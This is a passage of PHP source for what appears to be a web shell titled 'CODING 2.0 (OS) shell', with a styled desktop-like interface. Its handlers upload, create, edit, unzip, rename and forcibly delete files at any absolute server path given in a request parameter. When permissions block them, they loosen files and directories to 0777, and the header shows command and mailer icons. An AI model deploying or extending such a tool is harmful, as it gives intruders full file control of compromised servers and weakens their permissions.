        $dirPath = safePath($BASE_DIR, $rel);
        if ($dirPath && is_dir($dirPath)) {
            // Default to date-time-zip.zip if not provided
            $zipname = trim((string)($_POST['zipname'] ?? (date('Ymd-His') . '-zip.zip')));
            if ($zipname === '' || strpbrk($zipname, "\\/\0") !== false) {
                $error = 'Zip failed: invalid archive name.';
            } else {
                // Ensure .zip extension
                if (strtolower(pathinfo($zipname, PATHINFO_EXTENSION)) !== 'zip') {
                    $zipname .= '.zip';
                }
                $parent = dirname($dirPath);
                $base = pathinfo($zipname, PATHINFO_FILENAME);
                $zipPath = $parent . DIRECTORY_SEPARATOR . $zipname;
                $finalZip = $zipPath;
                if (file_exists($finalZip)) {
                    for ($i = 1; $i <= 99; $i++) {
                        $candidate = $parent . DIRECTORY_SEPARATOR . $base . '-' . $i . '.zip';
                        if (!file_exists($candidate)) { $finalZip = $candidate; break; }
                    }
                }
                $ok = zipDirectory($dirPath, $finalZip);
                if (!$ok) {
                    @chmod($parent, 0775);
                    clearstatcache(true, $parent);
                    $ok = zipDirectory($dirPath, $finalZip);
                    if (!$ok) {
                        @chmod($parent, 0777);
                        clearstatcache(true, $parent);
                        $ok = zipDirectory($dirPath, $finalZip);
                    }
                }
                if ($ok) {
                    $notice = 'Done';
                    $currentDir = $parent;
                } else {
                    $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
                    $parentWritable = is_writable($parent) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
                    $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                    $error = 'Zip failed: unable to create archive. Dir writable: ' . $dirWritable . ', parent writable: ' . $parentWritable . ', dir perms: ' . $dirPerm . ', parent perms: ' . $parentPerm . (class_exists('ZipArchive') ? '' : '. ZipArchive extension not available.');
                }
            }
        } else {
            $error = 'Zip failed: invalid folder path.';
        }
    }

    // Rename file or folder
    if (isset($_POST['do_rename']) && isset($_POST['rel']) && isset($_POST['newname'])) {
        $rel = (string)$_POST['rel'];
        $oldPath = safePath($BASE_DIR, $rel);
        $newname = trim((string)$_POST['newname']);
        if ($oldPath && (is_file($oldPath) || is_dir($oldPath))) {
            if ($newname === '' || strpbrk($newname, "\\/\0") !== false) {
                $error = 'Rename failed: invalid new name.';
            } else {
                // Build directory relative to BASE_DIR robustly (handles base without trailing slash)
                $dirAbs = dirname($oldPath);
                if (strpos($dirAbs, $BASE_DIR) === 0) {
                    $dirRel = ltrim(substr($dirAbs, strlen($BASE_DIR)), DIRECTORY_SEPARATOR);
                } else {
                    $dirRel = '';
                }
                $newRel = ($dirRel === '' ? '' : $dirRel . DIRECTORY_SEPARATOR) . $newname;
                // Build target path without requiring existence
                $newPath = $BASE_DIR . DIRECTORY_SEPARATOR . $newRel;
                $dir = dirname($oldPath);
                // Case-only rename handling on case-insensitive filesystems
                $caseOnly = (strcasecmp(basename($oldPath), $newname) === 0) && (basename($oldPath) !== $newname);
                if (!$caseOnly && file_exists($newPath)) {
                    $error = 'Rename failed: a file or folder with that name exists.';
                } elseif (!is_writable($dir)) {
                    $error = 'Rename failed: directory not writable.';
                } else {
                    // Try direct rename first
                    $ok = @rename($oldPath, $newPath);
                    if (!$ok) {
                        // Try to loosen permissions and retry
                        @chmod($oldPath, 0666);
                        @chmod($dir, 0775);
                        clearstatcache(true, $dir);
                        $ok = @rename($oldPath, $newPath);
                        if (!$ok) {
                            @chmod($dir, 0777);
                            clearstatcache(true, $dir);
                            $ok = @rename($oldPath, $newPath);
                        }
                    }
                    // Case-only rename: use temp intermediate to force refresh
                    if (!$ok && $caseOnly) {
                        $tmpName = '.rename_tmp_' . strval(mt_rand()) . '_' . strval(time());
                        $tmpPath = $dir . DIRECTORY_SEPARATOR . $tmpName;
                        $step1 = @rename($oldPath, $tmpPath);
                        if ($step1) {
                            $ok = @rename($tmpPath, $newPath);
                            if (!$ok) {
                                // Try to restore if step2 fails
                                @rename($tmpPath, $oldPath);
                            }
                        }
                    }
                    // File-only fallback: copy + unlink when rename blocked
                    if (!$ok && is_file($oldPath)) {
                        $copied = @copy($oldPath, $newPath);
                        if ($copied) {
                            @unlink($oldPath);
                            $ok = file_exists($newPath) && !file_exists($oldPath);
                        }
                    }
                    if ($ok) {
                        $notice = 'Done';
                        $currentDir = dirname($newPath);
                    } else {
                        $dir = dirname($oldPath);
                        $fileWritable = is_writable($oldPath) ? 'yes' : 'no';
                        $dirWritable = is_writable($dir) ? 'yes' : 'no';
                        $filePerm = sprintf('%o', @fileperms($oldPath) & 0777);
                        $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                        $lastErr = error_get_last();
                        $lastMsg = $lastErr['message'] ?? 'n/a';
                        $error = 'Rename failed: unable to rename. Path writable: ' . $fileWritable . ', parent writable: ' . $dirWritable . ', path perms: ' . $filePerm . ', parent perms: ' . $dirPerm . '. Tried chmod path 0666 and parent 0775/0777, temp two-step for case-only, and file copy+unlink fallback. Last error: ' . $lastMsg;
                    }
                }
            }
        } else {
            $error = 'Rename failed: invalid file path.';
        }
    }
}

// Absolute-path actions (outside base directory)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload file (absolute path)
    if (isset($_POST['do_upload_abs'])) {
    $absDir = realpath((string)($_POST['os'] ?? ''));
        if ($absDir !== false && is_dir($absDir)) {
            if (!isset($_FILES['upload']) || !is_array($_FILES['upload'])) {
                $error = 'Upload failed: missing file (abs).';
            } else {
                $file = $_FILES['upload'];
                if (($file['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) {
                    $error = 'Upload failed: error code ' . (int)$file['error'] . ' (abs).';
                } else {
                    $orig = (string)($file['name'] ?? '');
                    $base = basename($orig);
                    $safe = preg_replace('/[^A-Za-z0-9._-]/', '_', $base);
                    if ($safe === '' || $safe === false) {
                        $error = 'Upload failed: invalid filename (abs).';
                    } else {
                        $dest = $absDir . DIRECTORY_SEPARATOR . $safe;
                        if (file_exists($dest)) {
                            $i = 1;
                            $info = pathinfo($safe);
                            $stem = $info['filename'] ?? 'file';
                            $ext = isset($info['extension']) ? ('.' . $info['extension']) : '';
                            do {
                                $cand = $stem . '_' . $i . $ext;
                                $dest = $absDir . DIRECTORY_SEPARATOR . $cand;
                                $i++;
                            } while (file_exists($dest) && $i < 1000);
                        }
                        $ok = @move_uploaded_file($file['tmp_name'], $dest);
                        if ($ok) {
                            @chmod($dest, 0666);
                            $notice = 'Uploaded: ' . h(basename($dest));
                            // Redirect to absolute directory view
    $redir = '?os=' . h(urlencode($absDir));
                            header('Location: ' . $redir);
                            exit;
                        } else {
                            $error = 'Upload failed: unable to save file (abs).';
                        }
                    }
                }
            }
        } else {
            $error = 'Upload failed: invalid target directory (abs).';
        }
    }
    
    // Create new file or folder (absolute path)
    if (isset($_POST['do_create_abs'])) {
    $absDir = realpath((string)($_POST['os'] ?? ''));
        if ($absDir !== false && is_dir($absDir)) {
            $type = (string)($_POST['create_type'] ?? '');
            if ($type === 'file') {
                $name = trim((string)($_POST['file_name'] ?? ''));
                $ext = strtolower(trim((string)($_POST['file_ext'] ?? '')));
                $allowed = ['php','html','txt'];
                if ($name === '' || !preg_match('/^[A-Za-z0-9_-]+$/', $name)) {
                    $error = 'Create failed: invalid file name (abs).';
                } elseif (!in_array($ext, $allowed, true)) {
                    $error = 'Create failed: invalid extension (abs).';
                } else {
                    $fname = $name . '.' . $ext;
                    $target = $absDir . DIRECTORY_SEPARATOR . $fname;
                    if (file_exists($target)) {
                        $error = 'Create failed: a file with that name exists (abs).';
                    } else {
                        if ($ext === 'php') {
                            $content = "<?php\n// New file\n?>\n";
                        } elseif ($ext === 'html') {
                            $content = "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>New</title></head><body>\n</body></html>\n";
                        } else {
                            $content = ""; // txt
                        }
                        $okW = @file_put_contents($target, $content);
                        if ($okW === false) {
                            @chmod($absDir, 0775);
                            clearstatcache(true, $absDir);
                            $okW = @file_put_contents($target, $content);
                            if ($okW === false) {
                                @chmod($absDir, 0777);
                                clearstatcache(true, $absDir);
                                $okW = @file_put_contents($target, $content);
                            }
                        }
                        if ($okW !== false) {
                            @chmod($target, 0666);
                            $notice = 'Done';
                            $currentDir = $absDir;
                            // Redirect to absolute directory view after creation
    header('Location: ?os=' . h(urlencode($absDir)));
                            exit;
                        } else {
                            $dirWritable = is_writable($absDir) ? 'yes' : 'no';
                            $dirPerm = sprintf('%o', @fileperms($absDir) & 0777);
                            $error = 'Create failed: unable to write file (abs). Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm . '.';
                        }
                    }
                }
            } elseif ($type === 'folder') {
                $folder = trim((string)($_POST['folder_name'] ?? ''));
                if ($folder === '' || !preg_match('/^[A-Za-z0-9._-]+$/', $folder) || strpbrk($folder, "\\/\0") !== false) {
                    $error = 'Create failed: invalid folder name (abs).';
                } else {
                    $targetDir = $absDir . DIRECTORY_SEPARATOR . $folder;
                    if (file_exists($targetDir)) {
                        $error = 'Create failed: a folder with that name exists (abs).';
                    } else {
                        $okMk = @mkdir($targetDir, 0777, true);
                        if (!$okMk) {
                            @chmod($absDir, 0775);
                            clearstatcache(true, $absDir);
                            $okMk = @mkdir($targetDir, 0777, true);
                            if (!$okMk) {
                                @chmod($absDir, 0777);
                                clearstatcache(true, $absDir);
                                $okMk = @mkdir($targetDir, 0777, true);
                            }
                        }
                        if ($okMk) {
                            $notice = 'Done';
                            $currentDir = $absDir;
                            // Redirect to absolute directory view after creation
    header('Location: ?os=' . h(urlencode($absDir)));
                            exit;
                        } else {
                            $dirWritable = is_writable($absDir) ? 'yes' : 'no';
                            $dirPerm = sprintf('%o', @fileperms($absDir) & 0777);
                            $error = 'Create failed: unable to create folder (abs). Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm . '.';
                        }
                    }
                }
            } else {
                $error = 'Create failed: invalid type (abs).';
            }
        } else {
            $error = 'Create failed: invalid directory (abs).';
        }
    }
    // Edit file (absolute path)
    if (isset($_POST['do_edit_abs']) && isset($_POST['os'])) {
        $target = realpath((string)$_POST['os']);
        if ($target !== false && is_file($target)) {
            $content = (string)($_POST['content'] ?? '');
            $ok = @file_put_contents($target, $content, LOCK_EX);
            if ($ok === false) { $ok = @file_put_contents($target, $content); }
            if ($ok === false) {
                @chmod($target, 0666);
                clearstatcache(true, $target);
                $ok = @file_put_contents($target, $content, LOCK_EX);
                if ($ok === false) { $ok = @file_put_contents($target, $content); }
                if ($ok === false) {
                    $dir = dirname($target);
                    @chmod($dir, 0775);
                    clearstatcache(true, $dir);
                    $ok = @file_put_contents($target, $content, LOCK_EX);
                    if ($ok === false) { $ok = @file_put_contents($target, $content); }
                    if ($ok === false) {
                        @chmod($dir, 0777);
                        clearstatcache(true, $dir);
                        $ok = @file_put_contents($target, $content, LOCK_EX);
                        if ($ok === false) { $ok = @file_put_contents($target, $content); }
                    }
                }
            }
            if ($ok === false) {
                $dir = dirname($target);
                $fileWritable = is_writable($target) ? 'yes' : 'no';
                $dirWritable = is_writable($dir) ? 'yes' : 'no';
                $filePerm = sprintf('%o', @fileperms($target) & 0777);
                $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                $lastErr = error_get_last();
                $lastMsg = $lastErr['message'] ?? 'n/a';
                $error = 'Edit failed: unable to write file (abs). File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm . '. Last error: ' . $lastMsg;
            } else {
                clearstatcache(true, $target);
                $notice = 'Done';
                $currentDir = dirname($target);
            }
        } else {
            $error = 'Edit failed: invalid absolute file path.';
        }
    }
    // Unzip archive (absolute path)
    if (isset($_POST['do_unzip_abs']) && isset($_POST['os'])) {
        $zipPath = realpath((string)$_POST['os']);
        if ($zipPath !== false && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
            $folder = trim((string)($_POST['folder'] ?? ''));
            if ($folder === '' || strpbrk($folder, "\\/\0") !== false) {
                $error = 'Unzip failed: invalid folder name.';
            } else {
                $dir = dirname($zipPath);
                $targetDir = $dir . DIRECTORY_SEPARATOR . $folder;
                $finalDir = $targetDir;
                if (file_exists($finalDir)) {
                    for ($i = 1; $i <= 99; $i++) {
                        $candidate = $targetDir . '-' . $i;
                        if (!file_exists($candidate)) { $finalDir = $candidate; break; }
                    }
                }
                if (!is_dir($finalDir)) {
                    @mkdir($finalDir, 0777, true);
                    if (!is_dir($finalDir)) {
                        @chmod($dir, 0775);
                        clearstatcache(true, $dir);
                        @mkdir($finalDir, 0777, true);
                        if (!is_dir($finalDir)) {
                            @chmod($dir, 0777);
                            clearstatcache(true, $dir);
                            @mkdir($finalDir, 0777, true);
                        }
                    }
                }
                if (is_dir($finalDir)) {
                    if (!class_exists('ZipArchive')) {
                        $error = 'Unzip failed: ZipArchive extension not available.';
                    } else {
                        $zip = new ZipArchive();
                        $openRes = @$zip->open($zipPath);
                        if ($openRes === true) {
                            $okExtract = @$zip->extractTo($finalDir);
                            $zip->close();
                            if ($okExtract) {
                                $notice = 'Done';
                                $currentDir = $finalDir;
                            } else {
                                $fileWritable = is_writable($zipPath) ? 'yes' : 'no';
                                $dirWritable = is_writable($finalDir) ? 'yes' : 'no';
                                $filePerm = sprintf('%o', @fileperms($zipPath) & 0777);
                                $dirPerm = sprintf('%o', @fileperms($finalDir) & 0777);
                                $error = 'Unzip failed: extraction error.';
                            }
                        } else {
                            $error = 'Unzip failed: cannot open zip file.';
                        }
                    }
                } else {
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $error = 'Unzip failed: cannot create target directory.';
                }
            }
        } else {
            $error = 'Unzip failed: invalid absolute zip file.';
        }
    }
    // Delete file or folder (absolute path)
    if (isset($_POST['do_delete_abs']) && isset($_POST['os'])) {
        $target = realpath((string)$_POST['os']);
        if ($target !== false && (is_file($target) || is_dir($target))) {
            if (is_file($target)) {
                $dir = dirname($target);
                
                // Enhanced permission fixing for files
                $forceDeleteFile = function($filePath) {
                    $parentDir = dirname($filePath);
                    
                    // Try multiple permission combinations
                    $attempts = [
                        ['file' => 0666, 'dir' => 0755],
                        ['file' => 0777, 'dir' => 0775],
                        ['file' => 0777, 'dir' => 0777]
                    ];
                    
                    foreach ($attempts as $perms) {
                        @chmod($filePath, $perms['file']);
                        @chmod($parentDir, $perms['dir']);
                        clearstatcache(true, $filePath);
                        clearstatcache(true, $parentDir);
                        
                        if (@unlink($filePath)) {
                            return true;
                        }
                    }
                    return false;
                };
                
                $ok = $forceDeleteFile($target);
                if ($ok) {
                    // Log deleted file name with timestamp (typed)
                    try { @file_put_contents($trashLog, (string)time() . "\tfile\t" . basename($target) . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
                    $notice = 'Done';
                    $currentDir = $dir;
                } else {
                    $fileWritable = is_writable($target) ? 'yes' : 'no';
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $filePerm = sprintf('%o', @fileperms($target) & 0777);
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $lastErr = error_get_last();
                    $lastMsg = $lastErr['message'] ?? 'n/a';
                    $error = 'Delete failed: unable to remove file (abs). File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm . '. Last error: ' . $lastMsg;
                }
            } else {
                $dir = $target;
                $parent = dirname($dir);
                
                // Enhanced recursive delete with aggressive permission fixing
                $forceDeleteRecursive = function(string $d) use (&$forceDeleteRecursive): bool {
                    if (!is_dir($d)) return false;
                    
                    // First pass: fix all permissions recursively
                    recursiveChmod($d, 0777, 0777);
                    @chmod(dirname($d), 0777);
                    clearstatcache(true);
                    
                    $items = @scandir($d);
                    if ($items === false) return false;
                    
                    foreach ($items as $it) {
                        if ($it === '.' || $it === '..') continue;
                        $p = $d . DIRECTORY_SEPARATOR . $it;
                        
                        if (is_dir($p)) {
                            // Recursively delete subdirectories
                            if (!$forceDeleteRecursive($p)) {
                                // If normal delete fails, try aggressive permission fix
                                @chmod($p, 0777);
                                @chmod($d, 0777);
                                clearstatcache(true, $p);
                                if (!$forceDeleteRecursive($p)) return false;
                            }
                        } else {
                            // Delete files with permission fixing
                            @chmod($p, 0777);
                            @chmod($d, 0777);
                            clearstatcache(true, $p);
                            if (!@unlink($p)) {
                                // Try different permission combinations
                                @chmod($p, 0666);
                                clearstatcache(true, $p);
                                if (!@unlink($p)) return false;
                            }
                        }
                    }
                    
                    // Finally remove the directory itself
                    @chmod($d, 0777);
                    @chmod(dirname($d), 0777);
                    clearstatcache(true, $d);
                    return @rmdir($d);
                };
                
                $ok = $forceDeleteRecursive($dir);
                if ($ok) {
                    // Log deleted folder name with timestamp (typed)
                    try { @file_put_contents($trashLog, (string)time() . "\tfolder\t" . basename($dir) . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
                    $notice = 'Done';
                    $currentDir = $parent;
                } else {
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $parentWritable = is_writable($parent) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                    $lastErr = error_get_last();
                    $lastMsg = $lastErr['message'] ?? 'n/a';
                    $error = 'Delete failed: unable to remove folder (abs). Dir writable: ' . $dirWritable . ', parent writable: ' . $parentWritable . ', dir perms: ' . $dirPerm . ', parent perms: ' . $parentPerm . '. Last error: ' . $lastMsg;
                }
            }
        } else {
            $error = 'Delete failed: invalid absolute path.';
        }
    }
    // Zip folder (absolute path)
    if (isset($_POST['do_zip_abs']) && isset($_POST['os'])) {
        $dirPath = realpath((string)$_POST['os']);
        if ($dirPath !== false && is_dir($dirPath)) {
            $zipname = trim((string)($_POST['zipname'] ?? (date('Ymd-His') . '-zip.zip')));
            if ($zipname === '' || strpbrk($zipname, "\\/\0") !== false) {
                $error = 'Zip failed: invalid archive name.';
            } else {
                if (strtolower(pathinfo($zipname, PATHINFO_EXTENSION)) !== 'zip') {
                    $zipname .= '.zip';
                }
                $parent = dirname($dirPath);
                $base = pathinfo($zipname, PATHINFO_FILENAME);
                $zipPath = $parent . DIRECTORY_SEPARATOR . $zipname;
                $finalZip = $zipPath;
                if (file_exists($finalZip)) {
                    for ($i = 1; $i <= 99; $i++) {
                        $candidate = $parent . DIRECTORY_SEPARATOR . $base . '-' . $i . '.zip';
                        if (!file_exists($candidate)) { $finalZip = $candidate; break; }
                    }
                }
                $ok = zipDirectory($dirPath, $finalZip);
                if (!$ok) {
                    @chmod($parent, 0775);
                    clearstatcache(true, $parent);
                    $ok = zipDirectory($dirPath, $finalZip);
                    if (!$ok) {
                        @chmod($parent, 0777);
                        clearstatcache(true, $parent);
                        $ok = zipDirectory($dirPath, $finalZip);
                    }
                }
                if ($ok) {
                    $notice = 'Done';
                    $currentDir = $parent;
                } else {
                    $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
                    $parentWritable = is_writable($parent) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
                    $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                    $error = 'Zip failed: unable to create archive (abs).' . (class_exists('ZipArchive') ? '' : ' ZipArchive extension not available.');
                }
            }
        } else {
            $error = 'Zip failed: invalid absolute folder path.';
        }
    }
    // Rename file or folder (absolute path)
    if (isset($_POST['do_rename_abs']) && isset($_POST['os']) && isset($_POST['newname'])) {
        $oldPath = realpath((string)$_POST['os']);
        $newname = trim((string)$_POST['newname']);
        if ($oldPath !== false && (is_file($oldPath) || is_dir($oldPath))) {
            if ($newname === '' || strpbrk($newname, "\\/\0") !== false) {
                $error = 'Rename failed: invalid new name.';
            } else {
                $dir = dirname($oldPath);
                $newPath = $dir . DIRECTORY_SEPARATOR . $newname;
                $caseOnly = (strcasecmp(basename($oldPath), $newname) === 0) && (basename($oldPath) !== $newname);
                if (!$caseOnly && file_exists($newPath)) {
                    $error = 'Rename failed: a file or folder with that name exists.';
                } elseif (!is_writable($dir)) {
                    $error = 'Rename failed: directory not writable.';
                } else {
                    $ok = @rename($oldPath, $newPath);
                    if (!$ok) {
                        @chmod($oldPath, 0666);
                        @chmod($dir, 0775);
                        clearstatcache(true, $dir);
                        $ok = @rename($oldPath, $newPath);
                        if (!$ok) {
                            @chmod($dir, 0777);
                            clearstatcache(true, $dir);
                            $ok = @rename($oldPath, $newPath);
                        }
                    }
                    if (!$ok && $caseOnly) {
                        $tmpName = '.rename_tmp_' . strval(mt_rand()) . '_' . strval(time());
                        $tmpPath = $dir . DIRECTORY_SEPARATOR . $tmpName;
                        $step1 = @rename($oldPath, $tmpPath);
                        if ($step1) {
                            $ok = @rename($tmpPath, $newPath);
                            if (!$ok) {
                                @rename($tmpPath, $oldPath);
                            }
                        }
                    }
                    if (!$ok && is_file($oldPath)) {
                        $copied = @copy($oldPath, $newPath);
                        if ($copied) {
                            @unlink($oldPath);
                            $ok = file_exists($newPath) && !file_exists($oldPath);
                        }
                    }
                    if ($ok) {
                        $notice = 'Done';
                        $currentDir = dirname($newPath);
                    } else {
                        $fileWritable = is_writable($oldPath) ? 'yes' : 'no';
                        $dirWritable = is_writable($dir) ? 'yes' : 'no';
                        $filePerm = sprintf('%o', @fileperms($oldPath) & 0777);
                        $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                        $lastErr = error_get_last();
                        $lastMsg = $lastErr['message'] ?? 'n/a';
                        $error = 'Rename failed: unable to rename (abs). Path writable: ' . $fileWritable . ', parent writable: ' . $dirWritable . ', path perms: ' . $filePerm . ', parent perms: ' . $dirPerm . '. Last error: ' . $lastMsg;
                    }
                }
            }
        } else {
            $error = 'Rename failed: invalid absolute file path.';
        }
    }
}
// If the request was a form POST (not API), redirect to GET to avoid browser resubmission prompts
if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && !isset($_POST['api'])) {
    $qs = '?os=' . rawurlencode($currentDir);
    if (!empty($notice)) { $qs .= '&n=' . rawurlencode($notice); }
    if (!empty($error)) { $qs .= '&err=' . rawurlencode($error); }
    header('Location: ' . $qs, true, 303);
    exit;
}
$entries = @scandir($currentDir);
if (!is_array($entries)) $entries = [];
// Sort by type priority: folders (0), PHP (1), HTML (2), other files (3), ZIP last (4), then by name
usort($entries, function($a, $b) use ($currentDir) {
    // Keep special entries orderless; they are skipped later
    if ($a === '.' || $a === '..') return ($b === '.' || $b === '..') ? 0 : -1;
    if ($b === '.' || $b === '..') return 1;
    $fa = $currentDir . DIRECTORY_SEPARATOR . $a;
    $fb = $currentDir . DIRECTORY_SEPARATOR . $b;
    $da = is_dir($fa);
    $db = is_dir($fb);
    // Compute type priority
    $pa = $da ? 0 : (function($path) {
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        if ($ext === 'php') return 1;
        if ($ext === 'html' || $ext === 'htm') return 2;
        if ($ext === 'zip') return 4; // last
        return 3; // other files
    })($fa);
    $pb = $db ? 0 : (function($path) {
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        if ($ext === 'php') return 1;
        if ($ext === 'html' || $ext === 'htm') return 2;
        if ($ext === 'zip') return 4; // last
        return 3; // other files
    })($fb);
    if ($pa < $pb) return -1;
    if ($pa > $pb) return 1;
    // Same priority: sort by name (case-insensitive)
    return strcasecmp($a, $b);
});
$parent = dirname($currentDir);
$canGoUp = ($parent !== $currentDir) && (strpos($parent, $BASE_DIR) === 0);
// Desktop-style wallpaper support: allow ?wallpaper=<url or local filename>
// Use a Wikimedia image as reliable default (CORS-friendly)
$defaultWallpaper = 'https://images7.alphacoders.com/139/thumb-1920-1393184.png';
$wp = isset($_GET['wallpaper']) ? trim((string)$_GET['wallpaper']) : '';
if ($wp === '') {
    $wallpaperUrl = $defaultWallpaper;
} elseif (preg_match('/^https?:\/\//i', $wp)) {
    // Remote HTTP(S) image
    $wallpaperUrl = $wp;
} else {
    // Local file in current directory; prevent traversal
    $safeLocal = basename($wp);
    $localPath = $BASE_DIR . DIRECTORY_SEPARATOR . $safeLocal;
    if ($safeLocal !== '' && file_exists($localPath)) {
        // Use relative URL so the PHP built-in server can serve it
        $wallpaperUrl = $safeLocal;
    } else {
        $wallpaperUrl = $defaultWallpaper;
    }
}
// Determine if we should show post-login success overlay (flash)
$loginFlash = !empty($_SESSION['login_flash']);
if ($loginFlash) { unset($_SESSION['login_flash']); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CODING 2.0 (OS) shell - <?= h($_SERVER['SERVER_NAME'] ?? 'localhost'); ?></title>
    <script>
    (function(){
      var svg = "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='9' fill='none' stroke='LawnGreen' stroke-width='3' opacity='0.28'/><path d='M6 12a6 6 0 1 1 12 0' fill='none' stroke='#e6eef7' stroke-width='3' stroke-linecap='round'/><circle cx='12' cy='12' r='2' fill='LawnGreen'/><circle cx='12' cy='12' r='9' fill='none' stroke='LawnGreen' stroke-width='3' stroke-linecap='round' stroke-dasharray='56' stroke-dashoffset='42'/></svg>";
      var url = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
      var link = document.createElement('link');
      link.setAttribute('rel','icon');
      link.setAttribute('type','image/svg+xml');
      link.setAttribute('href', url);
      document.head.appendChild(link);
    })();
    </script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,500,1,0" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <style>
        :root { color-scheme: dark; --bg:#000000; --border:rgba(255,255,255,0.08); --text:#e8f0f7; --muted:#a0aab8; --accent:#86f58b; --accentDim:#4be05a; --danger:#ff8b8b; --wallpaper: url('<?= h($wallpaperUrl) ?>'); --wallpaperFallback: radial-gradient(1200px 600px at 10% 10%, #0b0b0b 0%, #0a0c10 45%, #0a0c10 100%); --acrylic: 0.58; --shadow: rgba(0,0,0,0.6); }
        body { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; background:#000; color:var(--text); margin:0; font-size: var(--textBase, 14px); }
        /* Laptop desktop wallpaper */
        body::before { content:""; position:fixed; inset:0; background-image: var(--wallpaper), var(--wallpaperFallback); background-size: cover, cover; background-position: center, center; background-repeat: no-repeat, no-repeat; background-attachment: fixed, fixed; z-index:-1; }
        header { padding:16px 24px; border-bottom:1px solid var(--border); background:transparent; position:sticky; top:0; z-index:5; }
        .header-bar { display:flex; align-items:center; justify-content:space-between; gap:12px; background: rgba(46,49,57,0.50); border:1px solid var(--border); border-radius:12px; padding:10px 18px; backdrop-filter: blur(8px) saturate(120%); box-shadow: 0 10px 20px rgba(0,0,0,0.28); }
        .app-icons { display:flex; align-items:center; gap:12px; }
        .app-icon { position: relative; }
        .app-icon::after { content: attr(data-label); position: absolute; top: 100%; left: 50%; transform: translateX(-50%) translateY(2px); background: rgba(24,26,32,0.85); border:1px solid var(--border); color:#cfd6df; padding:2px 6px; border-radius:6px; font-size:12px; white-space: nowrap; opacity:0; pointer-events: none; transition: opacity .15s ease, transform .15s ease; z-index: 1000; }
        .app-icon:hover::after { opacity:1; transform: translateX(-50%) translateY(0); }
.app-icon { width:38px; height:38px; display:flex; align-items:center; justify-content:center; border:1px solid var(--border); border-radius:10px; color:#cfd6df; background:transparent; text-decoration:none; }
.app-icon:hover { background: rgba(255,255,255,0.06); }
.app-icon .fa-brands { font-size:24px; }
.app-icon .material-symbols-rounded { font-size:24px; vertical-align:baseline; }

    #cmd-trigger .material-symbols-rounded { color:#ffffff; }
#notes-trigger .material-symbols-rounded { color: Khaki; }
#mailer-trigger .material-symbols-rounded { color:#4285f4; }
#logout-trigger .material-symbols-rounded { color:#ff3b3b; }
.app-icon .trash-icon { width:24px; height:24px; display:block; }
#trash-trigger .trash-icon { color:#ffffff; }
#trash-trigger:hover .trash-icon { color:#ffffff; }
        /* Header app icon brand colors */
        .app-icon .fa-telegram { color:#24A1DE; }
        .app-icon .fa-chrome {
            background: conic-gradient(from 45deg at 50% 50%, #ea4335 0deg 90deg, #fbbc05 90deg 180deg, #34a853 180deg 270deg, #4285f4 270deg 360deg);
            -webkit-background-clip: text; background-clip: text; color: transparent;
        }
        .app-icon .ic-folder { color: #32CD32; }
        /* Custom Browser OS icon (CODING-inspired C + spinner O) */
        .app-icon .browser-os-icon { width:24px; height:24px; }
        .browser-os-icon .c-letter { fill:#cfd6df; font-weight:800; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; font-size:14px; }
        .browser-os-icon circle.base { opacity:0.28; stroke:LawnGreen; }
        .browser-os-icon circle.dot { fill: LawnGreen; }
        .browser-os-icon circle.spin { transform-origin:12px 12px; animation: spin 1.2s linear infinite; stroke:LawnGreen; stroke-linecap: round; }
        /* Alternate Browser OS icon style */
    .app-icon .browser-os-icon-2 { width:24px; height:24px; }
    .browser-os-icon-2 .ring { stroke: LawnGreen; opacity:0.28; }
    .browser-os-icon-2 .c-arc { stroke: #e6eef7; }
    .browser-os-icon-2 .scan { stroke: LawnGreen; transform-origin:12px 12px; animation: spin 1.2s linear infinite; }
    .browser-os-icon-2 .dot { fill: LawnGreen; }

    /* Clean OS app icon */
    .app-icon .clean-icon { width:24px; height:24px; display:block; }
    #clean-trigger .clean-icon { color: LawnGreen; }
    .clean-icon .broom-stick { stroke: LawnGreen; opacity:0.85; }
    .clean-icon .broom-head { stroke: #e6f7ea; }
    .clean-icon .broom-bristle { stroke: #a3e8bd; }
